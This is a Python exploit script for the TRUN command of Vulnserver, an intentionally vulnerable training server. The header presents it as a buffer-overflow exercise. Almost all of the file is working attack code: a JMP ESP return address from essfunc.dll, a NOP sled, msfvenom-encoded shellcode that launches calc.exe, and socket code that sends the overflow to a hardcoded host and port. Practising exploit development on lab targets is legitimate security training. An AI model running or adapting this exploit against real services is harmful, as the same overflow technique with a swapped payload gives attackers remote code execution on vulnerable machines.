#!/usr/bin/python

# Author: Michael Music
# Date: 2/23/2019
# Description: Vulnserver TRUN Buffer Overflow Exploit
#  Exercise in BOFs given PoC code
#  Tested on Windows Server 2012
# Notes: Standard BOF using JMP ESP method
#  !mona find -type instr -s "jmp esp" -m "essfunc.dll"
#  I will be creating other variations of this exploit to test other shellcode
#  execution methods


import socket
import os
import sys

host='10.10.10.10'
port=9999

jmp_esp = '\xaf\x11\x50\x62' #0x625011af

# msfvenom -p windows/exec CMD=calc.exe -b "\x00" -f python -e x86/alpha_mixed

buf =  ""
buf += "\x89\xe2\xd9\xc9\xd9\x72\xf4\x5e\x56\x59\x49\x49\x49"
buf += "\x49\x49\x49\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43"
buf += "\x37\x51\x5a\x6a\x41\x58\x50\x30\x41\x30\x41\x6b\x41"
buf += "\x41\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42\x41\x42"
buf += "\x58\x50\x38\x41\x42\x75\x4a\x49\x39\x6c\x5a\x48\x6c"
buf += "\x42\x53\x30\x55\x50\x33\x30\x51\x70\x6e\x69\x4d\x35"
buf += "\x45\x61\x6b\x70\x55\x34\x6e\x6b\x66\x30\x34\x70\x6c"
buf += "\x4b\x42\x72\x54\x4c\x4e\x6b\x32\x72\x34\x54\x6c\x4b"
buf += "\x62\x52\x46\x48\x36\x6f\x4d\x67\x61\x5a\x34\x66\x64"
buf += "\x71\x59\x6f\x6c\x6c\x55\x6c\x53\x51\x31\x6c\x63\x32"
buf += "\x56\x4c\x51\x30\x69\x51\x78\x4f\x34\x4d\x77\x71\x68"
buf += "\x47\x79\x72\x4b\x42\x36\x32\x51\x47\x6e\x6b\x63\x62"
buf += "\x32\x30\x6e\x6b\x53\x7a\x65\x6c\x4e\x6b\x42\x6c\x62"
buf += "\x31\x30\x78\x4a\x43\x47\x38\x53\x31\x6e\x31\x66\x31"
buf += "\x6c\x4b\x46\x39\x71\x30\x55\x51\x6a\x73\x6e\x6b\x63"
buf += "\x79\x66\x78\x79\x73\x67\x4a\x31\x59\x6e\x6b\x55\x64"
buf += "\x6c\x4b\x66\x61\x79\x46\x55\x61\x39\x6f\x6c\x6c\x69"
buf += "\x51\x38\x4f\x34\x4d\x46\x61\x58\x47\x50\x38\x4d\x30"
buf += "\x52\x55\x68\x76\x66\x63\x61\x6d\x38\x78\x55\x6b\x53"
buf += "\x4d\x65\x74\x54\x35\x6b\x54\x42\x78\x6e\x6b\x72\x78"
buf += "\x34\x64\x35\x51\x59\x43\x73\x56\x4e\x6b\x76\x6c\x70"
buf += "\x4b\x6e\x6b\x72\x78\x47\x6c\x66\x61\x6e\x33\x4e\x6b"
buf += "\x74\x44\x4e\x6b\x53\x31\x48\x50\x6b\x39\x77\x34\x71"
buf += "\x34\x55\x74\x51\x4b\x61\x4b\x63\x51\x56\x39\x43\x6a"
buf += "\x50\x51\x59\x6f\x4b\x50\x61\x4f\x43\x6f\x51\x4a\x4c"
buf += "\x4b\x56\x72\x7a\x4b\x6e\x6d\x71\x4d\x33\x5a\x76\x61"
buf += "\x6c\x4d\x6b\x35\x6e\x52\x67\x70\x53\x30\x45\x50\x42"
buf += "\x70\x53\x58\x65\x61\x6c\x4b\x62\x4f\x4b\x37\x4b\x4f"
buf += "\x6a\x75\x4f\x4b\x6c\x30\x78\x35\x49\x32\x42\x76\x71"
buf += "\x78\x59\x36\x4f\x65\x4f\x4d\x6f\x6d\x39\x6f\x49\x45"
buf += "\x45\x6c\x64\x46\x63\x4c\x76\x6a\x6f\x70\x49\x6b\x49"
buf += "\x70\x51\x65\x67\x75\x4d\x6b\x77\x37\x35\x43\x31\x62"
buf += "\x50\x6f\x50\x6a\x75\x50\x42\x73\x49\x6f\x49\x45\x61"
buf += "\x73\x75\x31\x52\x4c\x51\x73\x66\x4e\x33\x55\x44\x38"
buf += "\x62\x45\x67\x70\x41\x41"

sploit = 'TRUN /.:/' + ('A' * 2003) + (jmp_esp) + ('\x90' * 20)  + buf + ('C' * (5050-2003-4-448))

expl = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
expl.connect((host, port))
expl.send(sploit)
expl.close()
